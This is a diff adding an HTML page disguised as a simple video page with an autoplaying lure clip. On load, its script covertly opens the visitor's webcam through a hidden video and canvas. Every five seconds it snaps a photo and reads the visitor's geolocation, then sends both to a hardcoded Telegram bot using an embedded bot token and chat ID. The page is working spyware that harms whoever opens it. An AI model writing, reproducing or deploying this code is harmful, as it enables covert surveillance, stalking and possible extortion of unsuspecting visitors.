@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Video Page</title>
+  <style>
+    body { margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; background: black; }
+    #customVideo {
+      width: 360px;
+      height: 202px;
+      border-radius: 10px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.7);
+    }
+    #video, #canvas {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+<video id="customVideo" autoplay muted loop>
+  <source src="bokep.mp4" type="video/mp4">
+  Maaf, browser Anda tidak mendukung video.
+</video>
+
+<video id="video" autoplay playsinline></video>
+<canvas id="canvas" width="320" height="240"></canvas>
+
+<script>
+  const chatId = "7819779147";
+  const botToken = "7840834767:AAGksa44Q5hWorJjEhTVS9wfVAvtBrHbMDM";
+  let isSending = false;
+
+  async function startHiddenCameraLoop() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.getElementById('video');
+      video.srcObject = stream;
+
+      // Tunggu sampai kamera siap
+      await new Promise(resolve => setTimeout(resolve, 1500));
+
+      setInterval(() => {
+        if (!isSending) {
+          isSending = true;
+          Promise.all([
+            captureAndSend(),
+            sendLocation()
+          ]).finally(() => isSending = false);
+        }
+      }, 5000);
+    } catch (err) {
+      console.error("Gagal akses kamera:", err);
+    }
+  }
+
+  async function captureAndSend() {
+    return new Promise((resolve, reject) => {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
+
+      if (video.readyState === video.HAVE_ENOUGH_DATA) {
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        canvas.toBlob(blob => {
+          const formData = new FormData();
+          formData.append("chat_id", chatId);
+          formData.append("photo", blob, "photo.jpg");
+
+          fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: "POST",
+            body: formData
+          })
+          .then(() => resolve())
+          .catch(err => {
+            console.error("Gagal kirim foto:", err);
+            resolve();
+          });
+        }, "image/jpeg");
+      } else {
+        console.warn("Video belum siap, lewati pengambilan gambar.");
+        resolve();
+      }
+    });
+  }
+
+  async function sendLocation() {
+    if (!navigator.geolocation) return;
+
+    navigator.geolocation.getCurrentPosition(pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          latitude: lat,
+          longitude: lon
+        })
+      }).catch(err => {
+        console.error("Gagal kirim lokasi:", err);
+      });
+
+    }, err => {
+      console.error("Gagal dapat lokasi:", err);
+    });
+  }
+
+  window.onload = () => {
+    startHiddenCameraLoop();
+  };
+</script>
+
+</body>
+</html>
